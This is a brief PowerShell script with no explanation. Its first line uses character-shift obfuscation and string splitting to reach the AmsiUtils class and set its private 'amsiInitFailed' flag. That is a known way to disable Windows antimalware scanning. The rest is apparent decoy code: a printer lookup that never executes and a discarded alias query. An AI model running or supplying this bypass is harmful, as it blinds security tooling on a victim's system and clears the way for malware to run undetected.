[Ref].Assembly.GetType($(-join('Kqklwe.Esfsywewfl.Smlgeslagf.SekaMladk'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+8)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+8)%26))}else{[char]$c}}))).GetField(('{0}{1}{2}{3}' -f 'amsiI','nitF','ail','ed'),('NonPu'+'blic,'+'Static')).SetValue($null,([math]::Pi -gt 3))
if ($false) {
    $printerInfo = Get-CimInstance -ClassName Win32_Printer | Select-Object -Property Name, DriverName -First 1; if ($printerInfo) { Write-Verbose "Default Printer Driver: $($printerInfo.DriverName)" }
}
Get-Alias -Name 'gci' -ErrorAction SilentlyContinue | Out-Null
